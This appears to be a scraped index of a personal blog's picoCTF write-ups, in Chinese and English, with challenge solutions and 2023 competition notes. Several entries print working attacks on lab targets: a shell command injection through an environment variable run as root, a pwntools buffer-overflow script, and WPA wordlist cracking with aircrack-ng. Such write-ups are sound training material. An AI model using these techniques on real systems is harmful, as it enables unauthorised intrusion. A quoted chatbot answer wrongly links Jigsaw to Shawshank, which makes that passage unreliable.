\u0026#34;e41a61908eb48b85dc78975c288e62a271b1f237fdc958162727d2930b9af850e908137655c5955a078ff1aa63f5509fbaf79d179d24d209a061c36e0709437b8d2641f41d354bdea062084ea3be8637ed1c4bd8cf63d16c942976dd9d6188fc5e419afae17493d7cdb93d84052637d15e7fa1f852f4f5d786c86bfd024df0dfcf8431e7230cfbbce76a1835b178020ef839af42c377706918a50aac56f79285d743f4a177425eb00eaeb2bebe99343911ab653fe64bb61e140153b113f8554fe29561756fafc7460683d59dd3ee50eb48b718443b9f49e663b6dd02b0a15297468ec30a4f487e328103cdbc59d1d66fc4f03ef75ae45d6ce2035fdfaeb86b7\u0026#34; c = int(c, 16) N = int(N, 16) while True: a = powmod(a, n, N) res = gcd(a-1, N) if res != 1 and res != N: q = N // res d = invert(e, (res-1)*(q-1)) m = powmod(c, d, N) print(bytes.fromhex(\u0026#39;{:x}\u0026#39;.format(m)).decode(\u0026#39;utf-8\u0026#39;)) break n += 1 Reference # $p-1$ Smooth\n"},{"id":335,"href":"/security/practice/picoctf/pwn/picoctf---vne/","title":"PicoCTF - VNE","section":"Securities","content":" PicoCTF - VNE # Background # System Environment Command Injection\nDescription \u0026amp; Hint # We\u0026rsquo;ve got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:53176, and run the binary named \u0026ldquo;bin\u0026rdquo; once connected. Login as ctf-player with the password, d137d16e\nHint 1: Have you checked the content of the /root folder Hint 2: Find a way to add more instructions to the ls Source Code # :::spoiler IDA Main Function\nint __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rax int v4; // ebx __int64 v5; // rax __int64 v6; // rax __int64 v7; // rax const char *v8; // rax __int64 v9; // rax __int64 v10; // rax char v12; // [rsp+3h] [rbp-6Dh] BYREF unsigned int v13; // [rsp+4h] [rbp-6Ch] char *v14; // [rsp+8h] [rbp-68h] char v15[32]; // [rsp+10h] [rbp-60h] BYREF char v16[40]; // [rsp+30h] [rbp-40h] BYREF unsigned __int64 v17; // [rsp+58h] [rbp-18h] v17 = __readfsqword(0x28u); v14 = getenv(\u0026#34;SECRET_DIR\u0026#34;); if ( v14 ) { v5 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Listing the content of \u0026#34;); v6 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v5, v14); v7 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(v6, \u0026#34; as root: \u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v7, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v12); std::string::basic_string(v16, v14, \u0026amp;v12); std::operator+\u0026lt;char\u0026gt;(v15, \u0026#34;ls \u0026#34;, v16); std::string::~string(v16); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v12); setgid(0); setuid(0); v8 = (const char *)std::string::c_str(v15); v13 = system(v8); if ( v13 ) { v9 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cerr, \u0026#34;Error: system() call returned non-zero value: \u0026#34;); v10 = std::ostream::operator\u0026lt;\u0026lt;(v9, v13); std::ostream::operator\u0026lt;\u0026lt;(v10, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); v4 = 1; } else { v4 = 0; } std::string::~string(v15); } else { v3 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cerr, \u0026#34;Error: SECRET_DIR environment variable is not set\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v3, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); return 1; } return v4; } :::\nRecon # 這一題也是蠻有趣的，題目有說要先執行bin，可以用winscp遠端把執行檔dump到local端，然後用IDA逆一下，就會發現它其實就是執行ls而已，所以我們就要用簡單的command injection達到RCE\nExploit # $ ssh ctf-player@saturn.picoctf.net -p 58395 $ ./bin Error: SECRET_DIR environment variable is not set $ export SECRET_DIR=/challenge/ $ ./bin Listing the content of /challenge/ as root: config-box.py metadata.json profile $ export \u0026#34;SECRET_DIR=/;cat /challenge/metadata.json\u0026#34; $ ./bin Listing the content of /;cat /challenge/metadata.json as root: bin challenge etc lib lib64 media opt root sbin sys usr boot dev home lib32 libx32 mnt proc run srv tmp var {\u0026#34;flag\u0026#34;: \u0026#34;picoCTF{Power_t0_man!pul4t3_3nv_19a6873b}\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;d137d16e\u0026#34;} Flag: picoCTF{Power_t0_man!pul4t3_3nv_19a6873b}\n"},{"id":336,"href":"/security/practice/picoctf/misc/flow/picoctf---webnet0/","title":"PicoCTF - WebNet0","section":"Securities","content":" PicoCTF - WebNet0 # Background # 解密TLS協議全記錄之利用wireshark解密\nRecon # 這一題其實就只是利用wireshark把訊息解密就這樣，所以看了一些文章後就按圖施工就好，解密完後就直接string search就找到了\nExploit - TLS Decrypt # 在Edit/Preferences/RSA Keys/中Add new keyfile 加入題目給的private key file後記得要重新開啟該pcap file "},{"id":337,"href":"/security/practice/picoctf/misc/general/picoctf---whitepages/","title":"PicoCTF - WhitePages","section":"Securities","content":" PicoCTF - WhitePages # tags: PicoCTF CTF Misc # Challenge: WhitePages\nSource code # :::spoiler source text\n:::\nExploit - Binary Encoding # If you use sublime editor to observe the file, then you may see the result as below. In unicode, \u0026lt;0x2003\u0026gt; is a kind of white space, then some gap between \u0026lt;0x2003\u0026gt; is a normal white space. Obviously, this is a binary encoding(\u0026lt;0x2003\u0026gt; is 0 and normal white space is 1)\n$\\to$\note that, must choose ASCII mode "},{"id":338,"href":"/security/practice/picoctf/web/picoctf---who-are-you_/","title":"PicoCTF - Who are you?","section":"Securities","content":" PicoCTF - Who are you? # tags: PicoCTF CTF Web # Background # 【Chrome 85 更新】淺談 Referer-Policy 和更新影響 # HTTP Referer 是什麼? # 當使用者訪問網站時，會發送請求 (request) 給伺服器主機，而請求 header 中會有一個欄位是「referer」，而此欄位會存放當前請求來源的位置，也就是說請求的來源頁面。\n舉個例子：當小明從「iT邦幫忙」網站中點擊連結後，進入「Max 行銷誌」網站時，所發送的 request 請求 referer 就會是 https://ithelp.ithome.com.tw/ 的網址。\nRFC 2616 - Date # The Date general-header field represents the date and time at which the message was originated, having the same semantics as orig-date in RFC 822. The field value is an HTTP-date, as described in section 3.3.1; it MUST be sent in RFC 1123 [8]-date format.\nDate = \u0026quot;Date\u0026quot; \u0026quot;:\u0026quot; HTTP-date An example is\nDate: Tue, 15 Nov 1994 08:12:31 GMT HTTP headers | DNT # The HTTP DNT Header is a request header that allows users to choose if their activity could be tracked by each server and web application that they communicate with via HTTP. The generated header field is a mechanism that allows the user to opt-in or out of the tracking. Tracking allows user to experience personalized content on web. The option to opt-out of tracking was created with growing privacy demands among users. Syntax:\nDNT:0 DNT:1 Directives :\nThe following field value is generated for HTTP DNT header field if the tracking preference is set as enabled\n1: This directive indicates that user prohibits tracking at the target site. 0: This directive indicates that user allows tracking on or the user has granted an exception at the given target site. Recon # 雖然這一題是for beginner但是想了超級無敵久還是不知道在考啥，因此也是只能拜讀別人的WP然後在印度口音的薰陶下找到解答，簡單來說就是考packet的header而已\nExploit - Header通靈 # Only people who use the official PicoBrowser are allowed on this site! 改User-Agent成PicoBrowser I don\u0026rsquo;t trust users visiting from another site 新增Referer: mercury.picoctf.net:34588 Sorry, this site only worked in 2018 新增Date: Tue, 15 Nov 2018 08:12:31 GMT I don\u0026rsquo;t trust users who can be tracked 新增DNT: 1 This website is only for people frome Sweden 上網搜尋一下Sweden的IP然後新增X-Forwarded-For: 109.75.224.255 You\u0026rsquo;re in Sweden but you don\u0026rsquo;t speak Swedish 上網搜尋Sweden Accept-Language然後新增Accept-Language: sv-SE就拿到flag了 Flag: picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_79e451a7}\nReference # who are you?? | PicoCTF | CTF for beginners\n"},{"id":339,"href":"/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/","title":"PicoCTF - Wireshark twoo twooo two twoo...","section":"Securities","content":" PicoCTF - Wireshark twoo twooo two twoo\u0026hellip; # tags: PicoCTF CTF Misc # Challenge: Wireshark twoo twooo two twoo\u0026hellip;\nExploit - DNS + sub-domain # Statistic Using statistic to analyze http requests and you\u0026rsquo;ll see that there is /flag and / in address 18.217.1.57. Maybe it\u0026rsquo;s a clue or key to find flag String search technique\n$ strings shark2.pcapng | grep \u0026#34;pico\u0026#34; picoCTF{bfe48e8500c454d647c55a4471985e776a07b26cba64526713f43758599aa98b} picoCTF{bda69bdf8f570a9aaab0e4108a0fa5f64cb26ba7d2269bb63f68af5d98b98245} picoCTF{fe83bcb6cfd43d3b79392f6a4232685f6ed4e7a789c2ce559cf3c1ab6adbe34b} picoCTF{711d3893d90f100c15e10ef4842abeed3a830f8237c1257cd47389646da97810} picoCTF{3cf1e22d489fcfb6bb312a34f46c8699989ed043406134331452d11ce73cd59e} picoCTF{b4cc138bb0f7f9da7e35085e349555aa6d00bdca3b021c1fe8663c0a422ce0d7} picoCTF{41b8a1a796bd8d202016f75bc5b38889e9ea06007e6b22fc856d380fb7573133} ... You\u0026rsquo;ll find tons of fake flag. Obviously, it\u0026rsquo;s a trap to distract you.\nReanalyze the file I found that there\u0026rsquo;re many DNS request to {sub-domain}.reddshrimpandherring.com. Also, I use the filter http and ip.addr==18.217.1.57 and follow the http stream. Seems this address is a clue.\n通靈: Set new filter payload: set the filter as dns and ip.dst==18.217.1.57 You\u0026rsquo;ll see that the sub-domain is a sequence base64 strings. Concate them and decode it, you can fetch the flag. $\\to$ cGljb0NURntkbnNfM3hmMWxfZnR3X2RlYWRiZWVmfQ== $\\to$ picoCTF{dns_3xf1l_ftw_deadbeef}\nReference # Wireshark twoo twooo two twoo\u0026hellip;\n"},{"id":340,"href":"/security/practice/picoctf/reverse/picoctf---wizardlike/","title":"PicoCTF - Wizardlike","section":"Securities","content":" PicoCTF - Wizardlike # Recon # 這一題蠻有趣的，如果只是單純執行程式碼，會發現是一個迷宮的遊戲，不過走越多會發現兩個現象\n遊戲本身根本無法破關 有一些\u0026quot;道路\u0026quot;回隨著角色本身的移動慢慢浮現出來 我也不知道是哪來的想法直覺想要看他的地圖，因為看IDA翻出來的code，貌似有十個關卡，而如果把地圖翻出來會發現每一個關卡總共會有10000個字元，然後每一列都是100個字元呈現，然後就發現他其實是用地圖的方式呈現他的flag，則我們可以先把10個關卡的所有字元另存一個檔案(純手工)，再寫一點點script就可以把flag還原\nExploit - 通靈 # f = open(\u0026#39;./cipher.txt\u0026#39;, \u0026#39;r\u0026#39;).read() pt = open(\u0026#39;./flag.txt\u0026#39;, \u0026#39;w\u0026#39;) flag = \u0026#34;\\n\u0026#34;.join([f[100 * i : 100 * i + 100] for i in range(len(f) // 100)]) pt.write(flag) :::spoiler flag\n######### #.......# ......#................................... #.......# ....................####.#####.#####..###. #........ .####.#..###..###..#.......#...#......#... #.......# .# #.#.#....# #.#.......#...###...#.... #.......# .####.#.#....# #.#.......#...#......#... #.......# .#....#..###..###...####...#...#......###. #.......# .#........................................ #.......# .......................................... #.......# #.......# #.......# #.......# #.......# #......\u0026gt;# ######### #####. ............................................................. #.\u0026ltu0026gt;.# ##### ################# ....... #\u0026lt;..............#. ..###.. #...............#.. .#...#. #..............#......###.. #...#.......#...#.. .#...#. #..###.....###..#. ..###.. #...#...#...#...# ....... #......#\u0026gt;#......# ....... #...............# #...#.......#...# #..###.....###..# #...#.......#...# #...............# #...............# #...............# ################# ... .. ....... .\u0026lt;. ####. .#####. ... ...#.. .#..... ... ...#....###... ..\u0026gt;#.. .#..... ####. .#..... .. ....... ....... ######################## #\u0026lt;.............#.......# #..............#.#...#.# #..............#.#...#.# #..............#.#####.# #..............#.....#.# #..............#.....#.# #..............#.......# #..............#.......# ######################## ....... .\u0026lt;..... ....... ....... ....... ....... ....... ....... ....... ....... ....... .....\u0026gt;. ....... ####### ....... .####.. .#...#. .####.. .#...#. .####.. ....... ....... ... .\u0026lt;......... ........... ... .. .. .. .. .. .. .. .............. ..##########.. .# #. .# ....... #. .# ..###.. #. .# .#...#. #. .# .#...#. #. .# .#...#. #. .# ..###.. #. .# ....... #. .# ....... #. .# #. ..##########.. .............\u0026gt; ######################### #\u0026ltu0026gt;# ########################. ... ....... .\u0026ltnFlag: picoCTF{ur_4_w1z4rd_8F4B04AE}\n"},{"id":341,"href":"/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/","title":"PicoCTF - WPA-ing Out","section":"Securities","content":" PicoCTF - WPA-ing Out # tags: PicoCTF CTF Misc # Challenge: WPA-ing Out\nBackground # Day 26 Wireless Attacks-無線攻擊(aircrack-ng)\nDescription \u0026amp; Hint # I thought that my password was super-secret, but it turns out that passwords passed over the AIR can be CRACKED, especially if I used the same wireless network password as one in the rockyou.txt credential dump. Use this pcap file and the rockyou wordlist. The flag should be entered in the picoCTF{XXXXXX} format.\nHint 1: Finding the IEEE 802.11 wireless protocol used in the wireless traffic packet capture is easier with wireshark, the JAWS of the network. Hint 2: Aircrack-ng can make a pcap file catch big air\u0026hellip;and crack a password.\nExploit - aircrack-ng # $ aircrack-ng wpa-ing_out.pcap -w ./rockyou.txt Reading packets, please wait... Opening wpa-ing_out.pcap Read 23523 packets. # BSSID ESSID Encryption 1 00:5F:67:4F:6A:1A Gone_Surfing WPA (1 handshake) Choosing first network as target. Reading packets, please wait... Opening wpa-ing_out.pcap Read 23523 packets. 1 potential targets Aircrack-ng 1.6 [00:00:00] 1183/10303727 keys tested (22306.13 k/s) Time left: 7 minutes, 41 seconds 0.01% KEY FOUND! [ mickeymouse ] Master Key : 61 64 B9 5E FC 6F 41 70 70 81 F6 40 80 9F AF B1 4A 9E C5 C4 E1 67 B8 AB 58 E3 E8 8E E6 66 EB 11 Transient Key : 26 85 7B AC DD 2C 44 E6 06 18 03 B0 0F F2 75 A2 32 63 F7 35 74 2D 18 10 1C 25 F9 14 BC 41 DA 58 52 48 86 B0 D6 14 89 F6 77 00 67 E0 AD 10 1B 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 EAPOL HMAC : 65 2F 6C 0E 75 F0 49 27 6A AA 6A 06 A7 24 B9 A9 So\u0026hellip;The flag is picoCTF{mickeymouse}\nReference # Install tshark Some error you may encounter ubuntu下安装lex,yacc WU1 - WPA-ing Out\n"},{"id":342,"href":"/security/practice/picoctf/pwn/picoctf---x-sixty-what/","title":"PicoCTF - x-sixty-what","section":"Securities","content":" PicoCTF - x-sixty-what # Source code # :::spoiler\n:::\nRecon # 這一題有點奇怪，沒有想像中簡單，看起來就是一個簡單的return 2 function的問題，但是看了objdump的flag function原本應該是0x401236，但是會友segmentation fault，看了其他的WP1，發現應該return到0x40123b，不太知道為甚麼\n第一張是return 2 0x401236 第二張是return 2 0x40123b Exploit # 用動態的方式看offset $$ 0x7fffffffd758 - 0x00007fffffffd710 = 0x48 $$ from pwn import * r = remote(\u0026#39;saturn.picoctf.net\u0026#39;, 58166) # r = process(\u0026#39;./vuln\u0026#39;) context.arch = \u0026#39;amd64\u0026#39; raw_input() print(r.recvline().strip().decode()) payload = b\u0026#39;a\u0026#39;*0x48 + p64(0x40123b) print(payload) r.sendline(payload) r.interactive() Flag: picoCTF{b1663r_15_b3773r_e79d5a75}\nReference # x-sixty-what WP\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":343,"href":"/security/practice/picoctf/crypto/classic/picoctf---xtraordinary/","title":"PicoCTF - XtraORdinary","section":"Securities","content":" PicoCTF - XtraORdinary # Background # How to Convert Hex String to Bytes in Python? Python 好用模組介紹 - itertools \u0026amp; more-itertools Python File readline() Method Python append to a file\nSource code # :::spoiler Source Code\n#!/usr/bin/env python3 from random import randint with open(\u0026#39;flag.txt\u0026#39;, \u0026#39;rb\u0026#39;) as f: flag = f.read() with open(\u0026#39;secret-key.txt\u0026#39;, \u0026#39;rb\u0026#39;) as f: key = f.read() def encrypt(ptxt, key): ctxt = b\u0026#39;\u0026#39; for i in range(len(ptxt)): a = ptxt[i] b = key[i % len(key)] ctxt += bytes([a ^ b]) return ctxt ctxt = encrypt(flag, key) random_strs = [ b\u0026#39;my encryption method\u0026#39;, b\u0026#39;is absolutely impenetrable\u0026#39;, b\u0026#39;and you will never\u0026#39;, b\u0026#39;ever\u0026#39;, b\u0026#39;ever\u0026#39;, b\u0026#39;ever\u0026#39;, b\u0026#39;ever\u0026#39;, b\u0026#39;ever\u0026#39;, b\u0026#39;ever\u0026#39;, b\u0026#39;break it\u0026#39; ] for random_str in random_strs: for i in range(randint(0, pow(2, 8))): for j in range(randint(0, pow(2, 6))): for k in range(randint(0, pow(2, 4))): for l in range(randint(0, pow(2, 2))): for m in range(randint(0, pow(2, 0))): ctxt = encrypt(ctxt, random_str) with open(\u0026#39;output.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(ctxt.hex()) :::\nRecon # 這一題我覺得出的不錯，首先他把flag和secret-key做XOR，然後做了一大堆random_strs之間的XOR，但我們都知道XOR做了兩次等於沒做，所以最後的output其實就是 $$ flag \\oplus key \\oplus lots\\ of\\ random\\ string=output $$ 所以如果我們要得到flag首先就是要先把random string的成分拿掉，因為他只有32種結果，也就是\nmy encryption method is absolutely impenetrable and you will never ever break it 之間的排列組合，進行XOR，然後我們可以用itertools中的combinations method，先把所有組合排出來(這個寫法還不錯，可以學起來)，然後依序把結果存起來，接著我們就要找出key是多少，由於第14行會把key延伸(反正大概就是這個意思)，而我們唯一知道的是最後的flag一定是picoCTF{開頭，也就是說這個key有大機率應該只有8個字元，那我們就可以拿前面得到的32種結果，直接和picoCTF{進行XOR然後查看一下最後的strings有沒有有意義且長度小於8的，從結果來看，的確有一個Africa!的東西印入眼簾，看起來應該就是我們的key，所以我們就可以直接進行最後的XOR得到flag\nExploit # from itertools import product from pwn import * from itertools import combinations root_path = \u0026#34;D:/NTU/CTF/PicoCTF/Crypto/XtraORdinary/\u0026#34; with open(root_path + \u0026#39;output.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: cipher = bytes.fromhex(f.read()) temp_pt = open(root_path + \u0026#39;temp_plaintext.txt\u0026#39;, \u0026#39;a\u0026#39;) def decrypt(ctxt, key): ptxt = b\u0026#39;\u0026#39; for i in range(len(ctxt)): a = ctxt[i] b = key[i % len(key)] ptxt += bytes([a ^ b]) return ptxt def sub_lists (l): comb = [] for i in range(1,len(l)+1): comb += [list(j) for j in combinations(l, i)] return comb random_strs = [ b\u0026#39;my encryption method\u0026#39;, b\u0026#39;is absolutely impenetrable\u0026#39;, b\u0026#39;and you will never\u0026#39;, b\u0026#39;ever\u0026#39;, b\u0026#39;break it\u0026#39; ] combos = sub_lists(random_strs) \u0026#39;\u0026#39;\u0026#39; 1st Step - Try to xor all combination of random strings \u0026#39;\u0026#39;\u0026#39; for i in range(len(combos)): tmp_cipher = cipher for j in range(len(combos[i])): # print(combos[i][j]) tmp_cipher = decrypt(tmp_cipher, combos[i][j]) # print() print(bytes.fromhex(tmp_cipher.hex()).decode(\u0026#39;cp437\u0026#39;)) temp_pt.writelines(tmp_cipher.hex() + \u0026#39;\\n\u0026#39;) temp_pt.close() \u0026#39;\u0026#39;\u0026#39; 2nd Step - Try to find key \u0026#39;\u0026#39;\u0026#39; key = b\u0026#39;picoCTF{\u0026#39; cipher = open(root_path + \u0026#39;temp_plaintext.txt\u0026#39;, \u0026#39;r\u0026#39;).readlines() for i in range(len(cipher)): ptxt = decrypt(bytes.fromhex(cipher[i].strip()), key) print(bytes.fromhex(ptxt.hex()).decode(\u0026#39;cp437\u0026#39;)) \u0026#39;\u0026#39;\u0026#39; 3rd Step - Find flag \u0026#39;\u0026#39;\u0026#39; key = b\u0026#39;Africa!\u0026#39; cipher = open(root_path + \u0026#39;temp_plaintext.txt\u0026#39;, \u0026#39;r\u0026#39;).readlines() for i in range(len(cipher)): ptxt = decrypt(bytes.fromhex(cipher[i].strip()), key) if \u0026#39;picoCTF{\u0026#39; in bytes.fromhex(ptxt.hex()).decode(\u0026#39;cp437\u0026#39;): print(f\u0026#34;Flag = {bytes.fromhex(ptxt.hex()).decode(\u0026#39;cp437\u0026#39;)}\u0026#34;) break Reference # pico crypto XtraORdinary wp - partender810 XtraORdinary WP - whiteSHADOW1234\n"},{"id":344,"href":"/security/competition/picoctf-2023/","title":"PicoCTF 2023","section":"Securities","content":" PicoCTF 2023 # :::spoiler [TOC] :::\nCrypto # HideToSee # Recon # 這一題比較像是Misc題目，比賽的時候想了很久都沒進展，賽後看了write up才覺得異常簡單，當初應該也是有往這方面想，但沒有用steghide\nExploit - Steghide + Atbash # 先用steghide解密出隱藏的文檔 $ steghide extract -sf atbash.jpg 用online tool解密 Reverse # Reverse # IDA Flag: picoCTF{3lf_r3v3r5ing_succe55ful_8108250b}\nSafe Opener 2 # Strings search Flag: picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_ccb5525e}\ntimer # Use mobsf Flag: picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}\nReady Gladiator 0 # ??? picoCTF{h3r0_t0_z3r0_4m1r1gh7_a220a377} Forensics # hideme # Use binwalk to observe that it should be a zip file.\n$ binwalk flag.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 512 x 504, 8-bit/color RGBA, non-interlaced 41 0x29 Zlib compressed data, compressed 39739 0x9B3B Zip archive data, at least v1.0 to extract, name: secret/ 39804 0x9B7C Zip archive data, at least v2.0 to extract, compressed size: 3037, uncompressed size: 3187, name: secret/flag.png 43076 0xA844 End of Zip archive, footer length: 22 Change extension to zip file and extract it\nFlag: PcapPoisoning # String Search pico Flag: picoCTF{P64P_4N4L7S1S_SU55355FUL_b1995216}\nMSB # Reference: CTF-Misc-LSB Flag was hidden in extracted text file: picoCTF{15_y0ur_que57_qu1x071c_0r_h3r01c_c02eeaac}\nUnforgottenBits(TBD) # recon # asef18766@vmware:~/picoCTF$ file disk.flag.img disk.flag.img: DOS/MBR boot sector; partition 1 : ID=0x83, active, start-CHS (0x0,32,33), end-CHS (0xc,223,19), startsector 2048, 204800 sectors; partition 2 : ID=0x82, start-CHS (0xc,223,20), end-CHS (0x2d,130,21), startsector 206848, 524288 sectors; partition 3 : ID=0x83, start-CHS (0x2d,130,22), end-CHS (0x82,138,8), startsector 731136, 1366016 sectors probable corrupted section info just dump file system with binwalk --dd=\u0026quot;.*\u0026quot;(note since i am too lazy to optimize the command, it may used up all your disk space) at offset 0x16500000 there is an ext4 file system, you can just open it with 7zip there\u0026rsquo;s something under his /home, but no clue with it :P FindAndOpen(TBD) # recon # some strings are send directly via raw socket probably some base64 string? but no clue with it :P iBwaWNvQ1RGe1 AABBHHPJGTFRLKVGhpcyBpcyB0aGUgc2VjcmV0OiBwaWNvQ1RGe1IzNERJTkdfTE9LZF8= PBwaWUvQ1RGesabababkjaASKBKSBACVVAVSDDSSSSDSKJBJS PBwaWUvQ1RGe1 ReadMyCert # Base64 decode the certificate strings Flag: picoCTF{read_mycert_4448b598}\nrotation # rot-18 Flag: picoCTF{r0tat1on_d3crypt3d_4a3dcb4c}\nFindAndOpen # picoCTF{R34DING_LOKd_fil56_succ3ss_419835ef} who is it # Recon # Strings search to find IP-liked strings - Sublime whois 173.249.33.206 picoCTF{WilhelmZwalina} UnforgottenBits # yone$ cat irclogs/**/*.log [08:12] \u0026lt;yone786\u0026gt; Ok, let me give you the keys for the light. [08:12] \u0026lt;avidreader13\u0026gt; I’m ready. [08:15] \u0026lt;yone786\u0026gt; First it’s steghide. [08:15] \u0026lt;yone786\u0026gt; Use password: akalibardzyratrundle [08:16] \u0026lt;avidreader13\u0026gt; Huh, is that a different language? [08:18] \u0026lt;yone786\u0026gt; Not really, don’t worry about it. [08:18] \u0026lt;yone786\u0026gt; The next is the encryption. Use openssl, AES, cbc. [08:19] \u0026lt;yone786\u0026gt; salt=0f3fa17eeacd53a9 key=58593a7522257f2a95cce9a68886ff78546784ad7db4473dbd91aecd9eefd508 iv=7a12fd4dc1898efcd997a1b9496e7591 [08:19] \u0026lt;avidreader13\u0026gt; Damn! Ever heard of passphrases? [08:19] \u0026lt;yone786\u0026gt; Don’t trust em. I seed my crypto keys with uuids. [08:20] \u0026lt;avidreader13\u0026gt; Ok, I get it, you’re paranoid. [08:20] \u0026lt;avidreader13\u0026gt; But I have no idea if that would work. [08:21] \u0026lt;yone786\u0026gt; Haha, I’m not paranoid. I know you’re not a good hacker dude. [08:21] \u0026lt;avidreader13\u0026gt; Is there a better way? [08:22] * yone786 yawns. [08:24] \u0026lt;yone786\u0026gt; You’re ok at hacking. I’m good at writing code and using it [08:24] \u0026lt;avidreader13\u0026gt; What language are you writing in? [08:26] \u0026lt;yone786\u0026gt; C [08:26] \u0026lt;avidreader13\u0026gt; Oh, I see. [08:26] \u0026lt;yone786\u0026gt; I’m glad you like it. I’m sure you wouldn’t understand half of what I was doing. [08:28] \u0026lt;avidreader13\u0026gt; I understand enough, but I do wish you wouldn’t take so much time with it. [08:28] \u0026lt;yone786\u0026gt; Sorry. Well, I wish you could learn some things. [08:29] \u0026lt;avidreader13\u0026gt; But it’s an incredible amount of time you spend on it. [08:29] \u0026lt;yone786\u0026gt; Haha, don’t take it like that. one$ cat notes/*.txt chizazerite guldulheen I keep forgetting this, but it starts like: yasuoaatrox... alene2# cat .lynx/browsing-history.log www.google.com https://www.google.com/search?q=number+encodings\u0026amp;source=hp\u0026amp;ei=WeC9Y77KJ_iwqtsP0sGu6A0\u0026amp;iflsig=AK50M_UAAAAAY73uaRxDkbHRUH8jn4OVhOgM8riUqvVI\u0026amp;ved=0ahUKEwj-2r_EgL78AhV4mGoFHdKgC90Q4dUDCAk\u0026amp;uact=5\u0026amp;oq=number+encodings\u0026amp;gs_lcp=Cgdnd3Mtd2l6EAMyBggAEBYQHjIFCAAQhgMyBQgAEIYDMgUIABCGAzIFCAAQhgM6DgguEIAEELEDEIMBENQCOgsIABCABBCxAxCDAToRCC4QgAQQsQMQgwEQxwEQ0QM6CAgAELEDEIMBOgsILhCABBCxAxCDAToFCAAQgAQ6CAgAEIAEELEDOggILhCABBDUAjoHCAAQgAQQCjoHCC4QgAQQClAAWI0VYPAXaABwAHgDgAHDA4gB-iKSAQkwLjMuNS40LjOYAQCgAQE\u0026amp;sclient=gws-wiz https://en.wikipedia.org/wiki/Church_encoding https://cs.lmu.edu/~ray/notes/numenc/ https://www.wikiwand.com/en/Golden_ratio_base 解 /home/yone/gallery/bmp steghide --extract -sf 7.bmp openssl enc -d -aes-256-cbc -pbkdf2 -iv 7a12fd4dc1898efcd997a1b9496e7591 -S 0f3fa17eeacd53a9 -K 58593a7522257f2a95cce9a68886ff78546784ad7db4473dbd91aecd9eefd508 -in les-mis.txt.enc -out ccc General Skill # money-ware # Chat-GPT is your friend Obviously is not Ransomware, so I asked the variant type of Ransomware.\n有沒有甚麼電腦病毒是ransomware的變形 \u0026gt;是的，還有其他的ransomware變形，以下是一些例子： Scareware: Scareware是一種偽造的安全軟件，通常被包裝成一個看起來很正常的防病毒軟件或系統工具。一旦安裝，它會顯示虛假的安全警告，告訴受害者他們的電腦被感染了，然後要求他們支付費用以解決問題。如果受害者支付了費用，騙子就會獲得受害者的信用卡資訊，並且沒有提供任何實際的解決方案。 Petya: Petya是一種高度進階的ransomware變形，它使用了一種稱為“全硬盤加密”的技術，這種技術可以將整個硬盤的內容加密，而不僅僅是檔案。此外，Petya可以使用Windows引導管理員功能進行攻擊，這使得它比其他ransomware更加難以檢測和清除。 Jigsaw: Jigsaw是一種具有惡意程式碼的ransomware，它的名字來自電影《肖申克的救贖》中的反派角色。一旦感染，Jigsaw會加密受害者的檔案，並在犧牲第一個檔案後要求贖金。如果受害者不支付，Jigsaw會刪除一些檔案，直到受害者支付為止。 這些ransomware變形都是非常危險的，並且可能會導致嚴重的損失。建議使用最新的防病毒軟件和更新的操作系統來防止感染，同時定期備份重要檔案以便在受到攻擊時恢復。 Flag: picoCTF{Petya}\nrepetitions # Just multiple base64 decode\u0026hellip; Flag: picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_a2d1b8b6}\nRules 2023 # It\u0026rsquo;s kind a web type\u0026hellip; Check the page source and just search picoCTF{ then you got it. Flag: picoCTF{h34rd_und3r5700d_4ck_cba1c711}\nchrono # Basic linux command skill\n$ ssh -p 63185 picoplayer@saturn.picoctf.net # enter password $ cd /challenge $ cat metadata.json {\u0026#34;flag\u0026#34;: \u0026#34;picoCTF{Sch3DUL7NG_T45K3_L1NUX_88865742}\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;picoplayer\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;lsPTmnodPc\u0026#34;} Flag: picoCTF{Sch3DUL7NG_T45K3_L1NUX_88865742}\nPermissions # Very similar to chrono Flag: picoCTF{uS1ng_v1m_3dit0r_8a15f6a3}\nSpecial # Special$ ${0} ${0} $ echo 1 1 $ ls blargh $ pwd /home/ctf-player $ echo $0 sh $ cat ^C $ ls blargh $ cat blargh cat: blargh: Is a directory $ cd bla* $ ls flag.txt $ cat flag.txt picoCTF{5p311ch3ck_15_7h3_w0r57_008cf854}$ Connection to saturn.picoctf.net closed by remote host. Specialer # $ echo \u0026quot;$(\u0026lt;./ala/kazam.txt)\u0026quot; 